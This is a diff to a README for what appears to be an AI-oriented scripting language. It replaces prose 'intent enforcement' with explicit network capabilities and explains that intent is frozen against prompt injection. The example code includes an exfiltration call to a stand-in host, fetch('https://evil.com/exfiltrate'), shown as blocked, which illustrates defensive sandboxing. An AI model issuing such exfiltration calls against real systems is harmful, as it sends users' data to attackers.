@@ -155,21 +155,24 @@ let data be fetch("https://api.example.com/data")
 let content be read_file("/data/report.csv")
 ```
 
-### Intent enforcement
+### Intent
 
-Declare what your program does. Actions outside the intent are blocked:
+Declare what your program is for. The intent is a human-readable description, used for auditing and as context for the LLM. It can be written in any language:
 
 ```
 intent: "Read customer data from api.shop.com and generate reports"
-
--- This works (matches intent):
-fetch("https://api.shop.com/customers")
-
--- This is BLOCKED (not in intent):
-fetch("https://evil.com/exfiltrate")
 ```
 
-The intent is frozen after declaration — prompt injection cannot expand it.
+The intent is **descriptive** — it does not authorize actions. Security is enforced by capabilities, which are explicit and predictable:
+
+```
+require net("api.shop.com")
+
+fetch("https://api.shop.com/customers")   -- works: capability granted
+fetch("https://evil.com/exfiltrate")      -- BLOCKED: no capability for evil.com
+```
+
+There is exactly one authorization model — capabilities — so behavior never depends on guessing the meaning of prose. The intent is frozen after declaration: a prompt injection cannot redeclare a broader intent.
 
 ### Per-task capabilities
 
